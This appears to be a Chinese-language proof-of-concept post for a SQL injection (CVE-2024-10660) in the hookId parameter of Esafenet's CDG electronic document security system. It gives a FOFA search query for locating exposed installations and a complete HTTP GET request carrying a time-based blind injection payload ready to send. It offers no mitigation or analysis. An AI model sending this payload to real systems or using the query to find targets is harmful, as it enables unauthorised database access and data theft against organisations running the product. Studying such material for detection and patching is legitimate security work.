# 亿赛通CDG电子文档安全管理系统DelHookService存在sql注入漏洞(CVE-2024-10660)

亿赛通CDG电子文档安全管理系统，该漏洞源于文件/com/esafenet/servlet/policy/HookService.java的参数hookId会导致SQL注入。

## fofa

```javascript
body="/CDGServer3/index.jsp"
```

## poc

```javascript
GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-Hans-CN;q=1
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411061657549.png)



## 漏洞来源

- https://flowus.cn/share/9d33a5d8-87b1-482b-8642-a8fcf27585ba?code=G8A6P3